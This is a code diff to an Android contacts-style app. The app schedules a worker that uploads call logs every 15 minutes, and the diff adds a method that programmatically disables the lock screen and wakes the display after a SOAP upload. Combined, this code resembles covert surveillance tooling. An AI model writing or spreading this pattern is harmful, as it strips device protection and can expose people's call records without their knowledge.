@@ -3,6 +3,7 @@ package com.example.tongxunluf;
 import android.Manifest;
 import android.annotation.SuppressLint;
 import android.app.Activity;
+import android.app.KeyguardManager;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
@@ -129,10 +130,12 @@ public class MainActivity extends AppCompatActivity {
         PeriodicWorkRequest periodicWorkRequest;
         periodicWorkRequest = new PeriodicWorkRequest.Builder(SendCallLogWorker.class,15, TimeUnit.MINUTES).build();
         WorkManager.getInstance(MainActivity.this).enqueueUniquePeriodicWork(SEND_CALL_LOG, ExistingPeriodicWorkPolicy.KEEP,periodicWorkRequest);
+
     }
 
     public void sendBySoap(View view){
         Upload.sendBySoap();
+        wakeup();
     }
 
 
@@ -151,7 +154,20 @@ public class MainActivity extends AppCompatActivity {
                 startActivity(intent);
             }
         }
-
-
+    }
+    @SuppressLint("MissingPermission")
+    public void wakeup() {
+        KeyguardManager km = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
+        KeyguardManager.KeyguardLock kl = km.newKeyguardLock("unLock");
+        //解锁
+        kl.disableKeyguard();
+        //获取电源管理器对象
+        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        //获取PowerManager.WakeLock对象,后面的参数|表示同时传入两个值,最后的是LogCat里用的Tag
+        @SuppressLint("InvalidWakeLockTag") PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.SCREEN_DIM_WAKE_LOCK, "bright");
+        //点亮屏幕
+        wl.acquire();
+        //释放
+        wl.release();
     }
 }
